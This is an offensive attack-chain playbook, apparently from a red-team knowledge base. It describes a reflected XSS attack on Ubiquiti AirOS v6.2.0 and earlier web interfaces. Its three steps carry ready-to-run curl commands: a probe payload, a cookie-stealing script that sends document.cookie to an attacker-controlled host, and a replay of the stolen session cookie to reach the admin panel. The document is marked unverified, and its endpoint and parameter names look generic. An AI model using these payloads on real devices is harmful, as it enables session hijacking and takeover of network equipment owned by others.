---
tags:
  - xss
  - reflected-xss
  - ubnt
  - airos
  - embedded-device
  - session-hijacking
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Vulnerable-AirOS-Endpoints]]'
  - '[[procedures/Inject-Reflected-XSS-Payload]]'
  - '[[procedures/Hijack-Session-and-Takeover-Admin]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:26.662Z'
description: >-
  A multi-stage attack exploiting reflected XSS vulnerabilities in AirMax AirOS
  v6.2.0 and prior to hijack user sessions and achieve admin account takeover on
  devices like Nanostation Loco M2.
skill_level: intermediate
impact_level: high
id: 47275854-606c-449a-8bde-6a7f63d34d1b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reflected XSS in Ubiquiti AirOS Web Interface Leading to Admin Session Hijacking

Multi-stage attack chain demonstrating exploitation of reflected XSS in AirMax AirOS v6.2.0 and prior versions on TI, XW, XM boards, including Nanostation Loco M2 (AirOS 6.1.7), to inject JavaScript payloads via unsanitized web interface parameters, abuse user sessions, and achieve admin account takeover. The vulnerability affects multiple endpoints and was fixed in AirOS v6.3.0.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Device] --> B[Inject XSS Payload]
    B --> C[Hijack Session and Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- Web browser (e.g., Firefox or Chrome)

### Target Environment

- Ubiquiti AirOS v6.2.0 or prior on embedded devices (e.g., Nanostation Loco M2 v6.1.7)
- Web interface accessible via HTTP/HTTPS (default port 80/443)
- Network access to the device's IP

### Initial Access Requirements

- Knowledge of the target's IP address or hostname
- Ability to send links to victims (e.g., via phishing)
- No prior credentials needed for initial injection, but victim must be authenticated

## Detailed Attack Procedures

### Step 1: Identify Vulnerable AirOS Endpoints
procedure: [[procedures/Identify-Vulnerable-AirOS-Endpoints]]

**Objective**: Locate the AirOS web interface and test parameters for XSS vulnerability.

**Instructions**: Access the device's web interface at http://<device-ip> and navigate to multiple endpoints (e.g., status pages or config forms). Use [[commands/curl-xss-test]] to probe parameters like 'search' or 'filter' for reflection without sanitization.

```bash
curl -G "http://<device-ip>/status.html" --data-urlencode "search=<script>alert(1)</script>"
```

Intercept requests with [[tools/Burp-Suite]] to identify injectable parameters.

**Expected Output**: Payload reflected in response without escaping, triggering alert(1) in browser.

**Success Indicators**:
- JavaScript alert pops up
- Payload visible in HTML response source

### Step 2: Inject Reflected XSS Payload
procedure: [[procedures/Inject-Reflected-XSS-Payload]]

**Objective**: Craft and deliver a malicious URL embedding the XSS payload to a victim user.

**Instructions**: Once a vulnerable parameter is found (e.g., in /login.html?msg=), replace with a payload to steal session cookies. Use [[commands/curl-payload-delivery]] to simulate or test:

```bash
curl -G "http://<device-ip>/login.html" --data-urlencode "msg=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
```

Send the full URL via email or link to the victim, who must click while accessing the device.

**Expected Output**: Victim's browser executes script, sending cookies to attacker's server.

**Success Indicators**:
- Attacker receives session data
- No server-side errors

### Step 3: Hijack Session and Takeover Admin
procedure: [[procedures/Hijack-Session-and-Takeover-Admin]]

**Objective**: Use stolen session to impersonate the user and escalate to admin privileges.

**Instructions**: With the captured session cookie, replay it in a browser or via [[commands/curl-session-replay]]:

```bash
curl -H "Cookie: session_id=STOLEN_VALUE" "http://<device-ip>/admin.html"
```

Navigate to admin panels to change credentials or execute actions.

**Expected Output**: Access to admin interface without authentication prompt.

**Success Indicators**:
- Admin dashboard loads
- Ability to modify device settings

## Attack Chain Summary

### Key Achievements

1. Identified unsanitized parameters in AirOS web interface
2. Injected and executed JavaScript payload for session theft
3. Achieved admin account takeover via hijacked credentials

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2024-10-01T00:00:00Z*
